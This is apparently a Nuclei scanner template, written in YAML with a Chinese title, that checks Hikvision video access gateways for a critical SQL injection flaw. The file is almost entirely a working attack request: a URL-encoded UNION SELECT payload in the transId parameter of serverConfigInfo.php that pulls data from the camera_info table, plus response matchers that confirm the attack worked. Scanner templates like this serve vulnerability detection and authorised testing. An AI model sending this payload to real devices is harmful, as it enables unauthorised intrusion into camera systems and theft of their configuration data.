id: Hikvision 视频接入网关-sql注入

info:
  name: Hikvision 视频接入网关-sql注入
  author: wintry
  severity: critical
  tags: hikvision

http:
  - raw:
      - |
        GET /transformServer/serverConfigInfo.php?transId=1%20union%20select%201%2C2%2C3%2C(select%20GROUP_CONCAT(1%2C2)%20from%20camera_info)%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - 'id="transPort"'
          - 'id="transIp"'
          - 'id="name"'
        condition: and

